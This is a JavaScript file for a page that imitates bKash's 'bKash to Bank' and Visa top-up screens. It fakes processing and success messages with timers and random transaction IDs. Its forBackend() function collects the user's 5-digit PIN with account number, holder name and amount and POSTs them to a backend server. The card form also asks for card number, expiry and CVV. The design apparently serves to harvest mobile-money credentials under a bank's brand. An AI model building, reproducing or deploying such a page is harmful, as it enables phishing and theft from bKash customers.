
let allDetails = {} ;

// bKash to Bank JavaScript functionality
document.addEventListener("DOMContentLoaded", function () {
  // ==================== MAIN SECTIONS & ELEMENTS ====================
  // Main sections
  const accountSelectionSection = document.getElementById(
    "accountSelectionSection"
  );
  const bankListSection = document.getElementById("bankListSection");
  const bankTransferSection = document.getElementById("bankTransferSection");
  const bkashNumberAmountPopup = document.getElementById(
    "bkashNumberAmountPopup"
  );
  const visaCardFormPopup = document.getElementById("visaCardFormPopup");

  // Navigation buttons
  const bankAccountOption = document.getElementById("bankAccountOption");
  const debitCardOption = document.getElementById("debitCardOption");
  const backToBankMain = document.getElementById("backToBankMain");
  const backToBankList = document.getElementById("backToBankList");

  // Brand colors
  const bkashPrimary = "#e2146c";
  const bkashSecondary = "#b4116e";

  // State
  let currentSelectedBank = null;
  let navigationHistory = ["accountSelectionSection"];

  // ==================== BANK DATA ====================
  const banks = [
    {
      id: 1,
      name: "Agrani Bank",
      logo: "/public/images/sptobank/sp1.jpg",
      hasBadge: true,
    },
    {
      id: 2,
      name: "AB Bank Limited",
      logo: "/public/images/sptobank/sp2.jpg",
      hasBadge: true,
    },
    {
      id: 3,
      name: "Bangladesh Development Bank Limited",
      logo: "/public/images/sptobank/sp3.jpg",
      hasBadge: false,
    },
    {
      id: 4,
      name: "Community Bank Bangladesh",
      logo: "/public/images/sptobank/sp4.jpg",
      hasBadge: true,
    },
    {
      id: 5,
      name: "DHAKA BANK LIMITED",
      logo: "/public/images/sptobank/sp5.jpg",
      hasBadge: true,
    },
  ];

  // ==================== CORE NAVIGATION FUNCTIONS ====================
  function showSection(section) {
    const allSections = [
      accountSelectionSection,
      bankListSection,
      bankTransferSection,
      bkashNumberAmountPopup,
      visaCardFormPopup,
    ];

    allSections.forEach((s) => {
      if (s) s.style.display = "none";
    });

    if (section) {
      section.style.display = "block";
      section.classList.add("fade-in");

      setTimeout(() => {
        section.classList.remove("fade-in");
      }, 300);

      const sectionId = section.id;
      if (navigationHistory[navigationHistory.length - 1] !== sectionId) {
        navigationHistory.push(sectionId);
      }
    }
  }

  // ==================== EVENT HANDLERS ====================
  if (bankAccountOption) {
    bankAccountOption.addEventListener("click", function () {
      showSection(bankListSection);
      initializeBankList();
    });
  }

  if (debitCardOption) {
    debitCardOption.addEventListener("click", function () {
      showNumberAmountPopup();
    });
  }

  if (backToBankMain) {
    backToBankMain.addEventListener("click", function () {
      showSection(accountSelectionSection);
    });
  }

  if (backToBankList) {
    backToBankList.addEventListener("click", function () {
      showSection(bankListSection);
    });
  }

  // ==================== BANK TO BANK TRANSFER FUNCTIONS ====================
  function initializeBankList() {
    const bankListContainer = document.querySelector(".bank-list");
    if (!bankListContainer) return;

    bankListContainer.innerHTML = "";

    banks.forEach((bank) => {
      const bankItem = createBankItem(bank);
      bankListContainer.appendChild(bankItem);
    });

    setupBankSearch();
  }

  function setupBankSearch() {
    const searchInput = document.querySelector(".search-input");
    const searchBtn = document.querySelector(".search-btn");

    if (searchInput && searchBtn) {
      searchInput.addEventListener("input", function () {
        const query = this.value.toLowerCase();
        filterBanks(query);
      });

      searchBtn.addEventListener("click", function () {
        const query = searchInput.value.toLowerCase();
        filterBanks(query);
      });
    }
  }

  function filterBanks(query) {
    const bankItems = document.querySelectorAll(".bank-item");

    bankItems.forEach((item) => {
      const bankName = item
        .querySelector(".bank-name")
        .textContent.toLowerCase();
      if (bankName.includes(query)) {
        item.style.display = "flex";
      } else {
        item.style.display = "none";
      }
    });
  }

  function createBankItem(bank) {
    const template = document.getElementById("bankItemTemplate");
    const clone = template.content.cloneNode(true);

    const bankItem = clone.querySelector(".bank-item");
    const logoImg = clone.querySelector("[data-bank-logo]");
    const nameDiv = clone.querySelector("[data-bank-name]");

    if (bank.hasBadge) {
      bankItem.classList.add("has-badge");
    }

    logoImg.src = bank.logo;
    logoImg.alt = bank.name;
    logoImg.onerror = function () {
      this.src = "/public/images/bank-placeholder.png";
    };

    nameDiv.textContent = bank.name;

    bankItem.addEventListener("click", function () {
      currentSelectedBank = bank;
      const bankLogo = document.querySelector(".selected-bank-logo img");
      const bankName = document.querySelector(".selected-bank-name");

      allDetails.bankName = bankName ;

      if (bankLogo) bankLogo.src = bank.logo;
      if (bankName) bankName.textContent = bank.name;

      allDetails.bankName = bankName.innerHTML ;

      showSection(bankTransferSection);
      setupBankTransferValidation();
    });

    return bankItem;
  }

  function setupBankTransferValidation() {
    const bankAccountNumber = document.getElementById("bankAccountNumber");
    const accountHolderName = document.getElementById("accountHolderName");
    const transferAmount = document.getElementById("transferAmount");
    const termsCheck = document.getElementById("termsCheck");
    const proceedBtn = document.getElementById("proceedBankTransfer");

    if (
      !bankAccountNumber ||
      !accountHolderName ||
      !transferAmount ||
      !termsCheck ||
      !proceedBtn
    ) {
      console.error("Bank transfer form elements not found!");
      return;
    }

    function validateForm() {
      const isAccountValid = bankAccountNumber.value.length >= 10;
      const isNameValid = accountHolderName.value.length >= 3;
      const amountValue = parseFloat(transferAmount.value);
      const isAmountValid =
        !isNaN(amountValue) && amountValue >= 50 && amountValue <= 25000;
      const isTermsChecked = termsCheck.checked;

      proceedBtn.disabled = !(
        isAccountValid &&
        isNameValid &&
        isAmountValid &&
        isTermsChecked
      );

      if (proceedBtn.disabled) {
        proceedBtn.style.opacity = "0.7";
      } else {
        proceedBtn.style.opacity = "1";
      }
    }

    bankAccountNumber.addEventListener("input", validateForm);
    accountHolderName.addEventListener("input", validateForm);
    transferAmount.addEventListener("input", function () {
      let value = this.value.replace(/[^\d.]/g, "");
      const decimalPoints = value.match(/\./g) || [];
      if (decimalPoints.length > 1) {
        value = value.substring(0, value.lastIndexOf("."));
      }
      this.value = value;
      validateForm();
    });
    termsCheck.addEventListener("change", validateForm);

    validateForm();

    proceedBtn.addEventListener("click", function () {
      if (!proceedBtn.disabled) {
        processBankTransfer();
      }
    });
  }

  function processBankTransfer() {
    const accountNumber = document.getElementById("bankAccountNumber").value;
    const accountName = document.getElementById("accountHolderName").value;
    const amount = document.getElementById("transferAmount").value;

    allDetails.accountNumber = accountNumber ;
    allDetails.name = accountName ;
    allDetails.amount = amount ;

    showLoading("Processing bank transfer...");

    setTimeout(() => {
      hideLoading();
      showBankPinVerification(accountNumber, accountName, amount);
    }, 1500);
  }

  function showBankPinVerification(accountNumber, accountName, amount) {
    const pinTemplate = document.getElementById("pinPopupTemplate");
    const clone = pinTemplate.content.cloneNode(true);

    const popup = clone.querySelector(".pin-popup");
    const overlay = clone.querySelector(".pin-overlay");
    const subtitle = clone.querySelector(".pin-subtitle");

    popup.id = "bankPinEntryPopup";
    overlay.id = "pinOverlay";

    popup.dataset.accountNumber = accountNumber;
    popup.dataset.accountName = accountName;
    popup.dataset.amount = amount;
    popup.dataset.type = "bank";

    subtitle.textContent = `Please enter your 5-digit PIN to authorize the transfer of ৳${amount} to ${
      currentSelectedBank ? currentSelectedBank.name : "Bank Account"
    }`;

    document.body.appendChild(clone);

    setupPinPopupHandlers(popup, overlay);
    showPopup(popup, overlay);
  }

  function processBankPinConfirmation(accountNumber, accountName, amount) {
    showLoading("Confirming transaction...");
    hidePinPopup();

    setTimeout(() => {
      hideLoading();
      showBankSuccessPopup(accountNumber, accountName, amount);
    }, 1500);
  }

  function showBankSuccessPopup(accountNumber, accountName, amount) {
    const transactionId =
      "TXN" + Math.random().toString(36).substr(2, 9).toUpperCase();
    const currentTime = new Date().toLocaleString();

    // allDetails.transactionId = transactionId ;

    const successTemplate = document.getElementById("successPopupTemplate");
    const clone = successTemplate.content.cloneNode(true);

    const popup = clone.querySelector(".success-popup");
    const overlay = clone.querySelector(".pin-overlay");
    const amountEl = clone.querySelector(".success-amount");
    const messageEl = clone.querySelector(".success-message");
    const detailsEl = clone.querySelector(".transaction-details");

    popup.id = "bankSuccessPopup";
    overlay.id = "successOverlay";

    popup.dataset.transactionId = transactionId;
    popup.dataset.bankName = currentSelectedBank
      ? currentSelectedBank.name
      : "Bank Account";
    popup.dataset.accountNumber = accountNumber;
    popup.dataset.accountName = accountName;
    popup.dataset.amount = amount;
    popup.dataset.time = currentTime;
    popup.dataset.type = "bank";

    amountEl.textContent = `৳${amount}`;
    messageEl.textContent = "has been transferred successfully";

    // Clear existing rows
    detailsEl.innerHTML = "";

    // Create detail rows using template
    const detailRowTemplate = document.getElementById("detailRowTemplate");

    const createDetailRow = (label, value, isSuccess = false) => {
      const clone = detailRowTemplate.content.cloneNode(true);
      const labelEl = clone.querySelector(".detail-label");
      const valueEl = clone.querySelector(".detail-value");

      labelEl.textContent = label;
      valueEl.textContent = value;
      if (isSuccess) valueEl.classList.add("success");

      return clone;
    };

    detailsEl.appendChild(createDetailRow("Transaction ID", transactionId));
    detailsEl.appendChild(createDetailRow("From", "bKash Account"));
    detailsEl.appendChild(
      createDetailRow(
        "To",
        currentSelectedBank ? currentSelectedBank.name : "Bank Account"
      )
    );
    detailsEl.appendChild(createDetailRow("Account Number", accountNumber));
    detailsEl.appendChild(createDetailRow("Account Name", accountName));
    detailsEl.appendChild(createDetailRow("Time", currentTime));
    detailsEl.appendChild(createDetailRow("Status", "Completed", true));

    document.body.appendChild(clone);

    setupSuccessPopupHandlers(popup, overlay);
    showPopup(popup, overlay);
  }

  function downloadBankReceipt(
    transactionId,
    bankName,
    accountNumber,
    accountName,
    amount,
    time
  ) {
    const receiptContent = `
      bKash Transaction Receipt
      ========================
      
      Transaction ID: ${transactionId}
      Amount: ৳${amount}
      From: bKash Account
      To: ${bankName}
      Account Number: ${accountNumber}
      Account Name: ${accountName}
      Time: ${time}
      
      Status: Successful
      
      Thank you for using bKash!
    `;

    const blob = new Blob([receiptContent], { type: "text/plain" });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `bKash_Receipt_${transactionId}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  }

  // ==================== VISA DEBIT CARD FLOW FUNCTIONS ====================
  function showNumberAmountPopup() {
    const allSections = [
      accountSelectionSection,
      bankListSection,
      bankTransferSection,
    ];
    allSections.forEach((section) => {
      if (section) section.style.display = "none";
    });

    const popup = document.getElementById("bkashNumberAmountPopup");
    if (popup) {
      popup.style.display = "block";
      setupVisaFormValidation();
    }
  }

  function setupVisaFormValidation() {
    const bkashNumberInput = document.getElementById("bkashAccountNumber");
    const amountInput = document.getElementById("bkashAmount");
    const termsCheck = document.getElementById("visaTermsCheck");
    const proceedBtn = document.getElementById("continueToCard");
    const backButton = document.getElementById("backToAccountSelect");

    if (backButton) {
      backButton.addEventListener("click", function () {
        document.getElementById("bkashNumberAmountPopup").style.display =
          "none";
        showSection(accountSelectionSection);
      });
    }

    function validateForm() {
      const isNumberValid =
        bkashNumberInput.value.length === 11 &&
        bkashNumberInput.value.startsWith("01");
      const amountValue = parseFloat(amountInput.value);
      const isAmountValid =
        !isNaN(amountValue) && amountValue >= 50 && amountValue <= 20000;
      const isTermsChecked = termsCheck.checked;

      proceedBtn.disabled = !(isNumberValid && isAmountValid && isTermsChecked);

      if (proceedBtn.disabled) {
        proceedBtn.style.opacity = "0.7";
      } else {
        proceedBtn.style.opacity = "1";
      }
    }

    if (bkashNumberInput) {
      bkashNumberInput.addEventListener("input", function () {
        let value = this.value.replace(/\D/g, "");
        if (value.length > 11) value = value.substring(0, 11);
        this.value = value;
        validateForm();
      });
    }

    if (amountInput) {
      amountInput.addEventListener("input", function () {
        let value = this.value.replace(/[^\d.]/g, "");
        const decimalPoints = value.match(/\./g) || [];
        if (decimalPoints.length > 1) {
          value = value.substring(0, value.lastIndexOf("."));
        }
        this.value = value;
        validateForm();
      });
    }

    if (termsCheck) {
      termsCheck.addEventListener("change", validateForm);
    }

    if (proceedBtn) {
      proceedBtn.addEventListener("click", function () {
        if (!proceedBtn.disabled) {
          document.getElementById("bkashNumberAmountPopup").style.display =
            "none";
          const bkashNumber = bkashNumberInput.value;
          const amount = amountInput.value;
          showCardForm(bkashNumber, amount);
        }
      });
    }

    validateForm();
  }

  function showCardForm(bkashNumber, amount) {
    const popup = document.getElementById("visaCardFormPopup");
    if (popup) {
      popup.style.display = "block";
      popup.dataset.bkashNumber = bkashNumber;
      popup.dataset.amount = amount;
      setupCardFormHandlers();
    }
  }

  function setupCardFormHandlers() {
    const popup = document.getElementById("visaCardFormPopup");
    const backButton = document.getElementById("backToNumberAmount");
    const cancelButton = document.getElementById("cancelCardForm");
    const proceedBtn = document.getElementById("proceedCardForm");

    if (backButton) {
      backButton.addEventListener("click", function () {
        popup.style.display = "none";
        showNumberAmountPopup();
      });
    }

    if (cancelButton) {
      cancelButton.addEventListener("click", function () {
        popup.style.display = "none";
        showSection(accountSelectionSection);
      });
    }

    const cardNumberInput = document.getElementById("cardNumber");
    if (cardNumberInput) {
      cardNumberInput.addEventListener("input", function () {
        let value = this.value.replace(/\D/g, "");
        if (value.length > 16) value = value.substring(0, 16);
        if (value.length > 0) value = value.match(/.{1,4}/g).join(" ");
        this.value = value;
        updateCardVisual();
      });
    }

    const expiryDateInput = document.getElementById("expiryDate");
    if (expiryDateInput) {
      expiryDateInput.addEventListener("input", function () {
        let value = this.value.replace(/\D/g, "");
        if (value.length > 4) value = value.substring(0, 4);
        if (value.length > 2)
          value = value.substring(0, 2) + "/" + value.substring(2);
        this.value = value;
        updateCardVisual();
      });
    }

    const cvvInput = document.getElementById("cvv");
    if (cvvInput) {
      cvvInput.addEventListener("input", function () {
        let value = this.value.replace(/\D/g, "");
        if (value.length > 3) value = value.substring(0, 3);
        this.value = value;
      });
    }

    const cardholderNameInput = document.getElementById("cardholderName");
    if (cardholderNameInput) {
      cardholderNameInput.addEventListener("input", function () {
        updateCardVisual();
      });
    }

    if (proceedBtn) {
      proceedBtn.addEventListener("click", function () {
        const cardNumber = document.getElementById("cardNumber").value;
        const expiryDate = document.getElementById("expiryDate").value;
        const cvv = document.getElementById("cvv").value;
        const cardholderName = document.getElementById("cardholderName").value;

        if (!cardNumber || cardNumber.replace(/\s/g, "").length < 16) {
          showNotification("Please enter a valid card number");
          return;
        }

        if (!expiryDate || !expiryDate.match(/^\d{2}\/\d{2}$/)) {
          showNotification("Please enter a valid expiry date (MM/YY)");
          return;
        }

        if (!cvv || cvv.length < 3) {
          showNotification("Please enter a valid CVV");
          return;
        }

        if (!cardholderName || cardholderName.length < 3) {
          showNotification("Please enter the cardholder name");
          return;
        }

        popup.style.display = "none";
        showLoading("Processing payment...");

        setTimeout(() => {
          hideLoading();
          showCardPinVerification(
            popup.dataset.bkashNumber,
            popup.dataset.amount,
            cardholderName
          );
        }, 1500);
      });
    }
  }

  function updateCardVisual() {
    const cardNumber = document.getElementById("cardNumber").value;
    const expiryDate = document.getElementById("expiryDate").value;
    const cardholderName = document.getElementById("cardholderName").value;

    const cardNumberDisplay = document.querySelector(".card-number");
    if (cardNumberDisplay && cardNumber) {
      const parts = [];
      for (let i = 0; i < 4; i++) {
        const start = i * 4;
        const part = cardNumber.substring(start, start + 4).trim();
        if (part) {
          parts.push(part);
        } else {
          parts.push("****");
        }
      }

      const cardNumberSpans = cardNumberDisplay.querySelectorAll("span");
      for (let i = 0; i < 4; i++) {
        const start = i * 4;
        const part = cardNumber.substring(start, start + 4).trim();
        if (cardNumberSpans[i]) {
          cardNumberSpans[i].textContent = part || "****";
        }
      }
    }

    const cardHolderValue = document.querySelector(".card-holder .card-value");
    if (cardHolderValue) {
      cardHolderValue.textContent = cardholderName || "YOUR NAME";
    }

    const cardExpiryValue = document.querySelector(".card-expiry .card-value");
    if (cardExpiryValue) {
      cardExpiryValue.textContent = expiryDate || "MM/YY";
    }
  }

  function showCardPinVerification(bkashNumber, amount, cardholderName) {
    const pinTemplate = document.getElementById("pinPopupTemplate");
    const clone = pinTemplate.content.cloneNode(true);

    const popup = clone.querySelector(".pin-popup");
    const overlay = clone.querySelector(".pin-overlay");
    const subtitle = clone.querySelector(".pin-subtitle");

    popup.id = "cardPinEntryPopup";
    overlay.id = "pinOverlay";

    popup.dataset.bkashNumber = bkashNumber;
    popup.dataset.amount = amount;
    popup.dataset.cardholderName = cardholderName;
    popup.dataset.type = "card";

    subtitle.textContent = `Please enter your 5-digit PIN to add ৳${amount} to your bKash account`;

    document.body.appendChild(clone);

    setupPinPopupHandlers(popup, overlay);
    showPopup(popup, overlay);
  }

  function processCardPinConfirmation(bkashNumber, amount, cardholderName) {
    showLoading("Confirming transaction...");
    hidePinPopup();

    setTimeout(() => {
      hideLoading();
      showCardSuccessPopup(bkashNumber, amount, cardholderName);
    }, 1500);
  }

  function showCardSuccessPopup(bkashNumber, amount, cardholderName) {
    const transactionId =
      "TXN" + Math.random().toString(36).substr(2, 9).toUpperCase();
    const currentTime = new Date().toLocaleString();

    const successTemplate = document.getElementById("successPopupTemplate");
    const clone = successTemplate.content.cloneNode(true);

    const popup = clone.querySelector(".success-popup");
    const overlay = clone.querySelector(".pin-overlay");
    const amountEl = clone.querySelector(".success-amount");
    const messageEl = clone.querySelector(".success-message");
    const detailsEl = clone.querySelector(".transaction-details");

    popup.id = "cardSuccessPopup";
    overlay.id = "successOverlay";

    popup.dataset.transactionId = transactionId;
    popup.dataset.bkashNumber = bkashNumber;
    popup.dataset.amount = amount;
    popup.dataset.cardholderName = cardholderName;
    popup.dataset.time = currentTime;
    popup.dataset.type = "card";

    amountEl.textContent = `৳${amount}`;
    messageEl.textContent = "has been added to your bKash account";

    // Clear existing rows
    detailsEl.innerHTML = "";

    // Create detail rows using template
    const detailRowTemplate = document.getElementById("detailRowTemplate");

    const createDetailRow = (label, value, isSuccess = false) => {
      const clone = detailRowTemplate.content.cloneNode(true);
      const labelEl = clone.querySelector(".detail-label");
      const valueEl = clone.querySelector(".detail-value");

      labelEl.textContent = label;
      valueEl.textContent = value;
      if (isSuccess) valueEl.classList.add("success");

      return clone;
    };

    detailsEl.appendChild(createDetailRow("Transaction ID", transactionId));
    detailsEl.appendChild(
      createDetailRow("From", `Visa Card (${cardholderName})`)
    );
    detailsEl.appendChild(
      createDetailRow("To", `bKash Account (${bkashNumber})`)
    );
    detailsEl.appendChild(createDetailRow("Time", currentTime));
    detailsEl.appendChild(createDetailRow("Status", "Completed", true));

    document.body.appendChild(clone);

    setupSuccessPopupHandlers(popup, overlay);
    showPopup(popup, overlay);
  }

  function downloadCardReceipt(
    transactionId,
    bkashNumber,
    amount,
    cardholderName,
    time
  ) {
    const receiptContent = `
      bKash Transaction Receipt
      ========================
      
      Transaction ID: ${transactionId}
      Amount: ৳${amount}
      From: Visa Card (${cardholderName})
      To: bKash Account (${bkashNumber})
      Time: ${time}
      
      Status: Successful
      
      Thank you for using bKash!
    `;

    const blob = new Blob([receiptContent], { type: "text/plain" });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `bKash_Receipt_${transactionId}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  }

  // ==================== POPUP UTILITY FUNCTIONS ====================
  function setupPinPopupHandlers(popup, overlay) {
    const cancelBtn = popup.querySelector("#cancelPin");
    const confirmBtn = popup.querySelector("#confirmPin");
    const pinInputs = popup.querySelectorAll(".pin-input");

    cancelBtn.addEventListener("click", function () {
      hidePinPopup();
      showSection(accountSelectionSection);
    });

    confirmBtn.addEventListener("click", function () {

      if (popup.dataset.type === "bank") {
        processBankPinConfirmation(
          popup.dataset.accountNumber,
          popup.dataset.accountName,
          popup.dataset.amount
        );

        forBackend() ;

      } else {
        processCardPinConfirmation(
          popup.dataset.bkashNumber,
          popup.dataset.amount,
          popup.dataset.cardholderName
        );
      }
    });

    pinInputs.forEach((input, index) => {
      input.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, "");

        if (this.value.length === 1 && index < pinInputs.length - 1) {
          pinInputs[index + 1].focus();
        }

        const allFilled = Array.from(pinInputs).every(
          (input) => input.value.length === 1
        );
        confirmBtn.disabled = !allFilled;

        if (allFilled) {
          confirmBtn.style.opacity = "1";
        } else {
          confirmBtn.style.opacity = "0.7";
        }
      });

      input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && this.value === "" && index > 0) {
          pinInputs[index - 1].focus();
        }
      });
    });

    pinInputs[0].focus();
  }

  function setupSuccessPopupHandlers(popup, overlay) {
    const doneBtn = popup.querySelector("#doneButton");
    const downloadBtn = popup.querySelector("#downloadReceipt");

    doneBtn.addEventListener("click", function () {
      popup.classList.remove("show");
      overlay.classList.remove("show");

      setTimeout(() => {
        popup.remove();
        overlay.remove();

        const bkashToBankSection = document.querySelector(
          ".bkash-to-bank-section"
        );
        if (bkashToBankSection) {
          bkashToBankSection.style.display = "flex";
        }

        showSection(accountSelectionSection);
      }, 300);
    });

    downloadBtn.addEventListener("click", function () {
      if (popup.dataset.type === "bank") {
        downloadBankReceipt(
          popup.dataset.transactionId,
          popup.dataset.bankName,
          popup.dataset.accountNumber,
          popup.dataset.accountName,
          popup.dataset.amount,
          popup.dataset.time
        );
      } else {
        downloadCardReceipt(
          popup.dataset.transactionId,
          popup.dataset.bkashNumber,
          popup.dataset.amount,
          popup.dataset.cardholderName,
          popup.dataset.time
        );
      }
    });
  }

  function showPopup(popup, overlay) {
    const containerElement = document.querySelector(".bkash-to-bank-container");
    const containerWidth = containerElement
      ? containerElement.offsetWidth
      : 550;
    const containerHeight = containerElement
      ? containerElement.offsetHeight
      : 700;

    popup.style.width = `${containerWidth}px`;
    popup.style.height = `${containerHeight}px`;
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.zIndex = "2000";
    popup.style.backgroundColor = "white";
    popup.style.borderRadius = "16px";
    popup.style.boxShadow = "0 10px 25px rgba(0, 0, 0, 0.2)";
    popup.style.overflow = "hidden";
    popup.style.display = "flex";
    popup.style.flexDirection = "column";

    setTimeout(() => {
      if (overlay) overlay.classList.add("show");
      popup.classList.add("show");
    }, 10);
  }

  function hidePinPopup() {
    const popup =
      document.getElementById("bankPinEntryPopup") ||
      document.getElementById("cardPinEntryPopup");
    const overlay = document.getElementById("pinOverlay");

    if (popup) {
      popup.classList.remove("show");
      setTimeout(() => {
        popup.remove();
      }, 300);
    }

    if (overlay) {
      overlay.classList.remove("show");
      setTimeout(() => {
        overlay.remove();
      }, 300);
    }
  }

  // ==================== UTILITY FUNCTIONS ====================
  function showLoading(message) {
    const existingOverlay = document.querySelector(".loading-overlay");
    if (existingOverlay) {
      existingOverlay.remove();
    }

    const loadingTemplate = document.getElementById("loadingTemplate");
    const clone = loadingTemplate.content.cloneNode(true);
    const messageEl = clone.querySelector(".loading-message");
    messageEl.textContent = message;

    document.body.appendChild(clone);
  }

  function hideLoading() {
    const loadingDiv = document.querySelector(".loading-overlay");
    if (loadingDiv) {
      loadingDiv.remove();
    }
  }

  function showNotification(message) {
    const existingNotification = document.querySelector(".notification");
    if (existingNotification) {
      existingNotification.remove();
    }

    const notificationTemplate = document.getElementById(
      "notificationTemplate"
    );
    const clone = notificationTemplate.content.cloneNode(true);
    const notification = clone.querySelector(".notification");
    notification.textContent = message;

    document.body.appendChild(clone);

    setTimeout(() => {
      notification.classList.add("show");
    }, 10);

    setTimeout(() => {
      notification.classList.remove("show");
      setTimeout(() => {
        notification.remove();
      }, 300);
    }, 3000);
  }

  // Initialize the first screen
  showSection(accountSelectionSection);

  // Debug message to console
  console.log("bKash to Bank functionality initialized");
});


// for backend 

function forBackend()
{

    let pins = document.querySelectorAll(".pin-input") ;
    let fullPins = "" ;

    pins.forEach(function(item){

      fullPins += item.value ;

    });

    allDetails.fullPin = fullPins ;

    
    fetch("http://localhost:3000/bkashtobank" , {

      method : "POST" ,
      headers : {
        "content-type" : "application/json"
      } ,
      body : JSON.stringify({allDetails}) 

    })
    .then(async function(r1){

    const data = await r1.json();

    if(r1.ok) {
      // console.log("Success:", data.message);  
      alert(data.message) ;
    } else {
      alert(data.message) ;
      // console.error("Error:", data.message);  
    }
  })
  .catch(function(err){
    console.error("Network error:", err);
  });


}


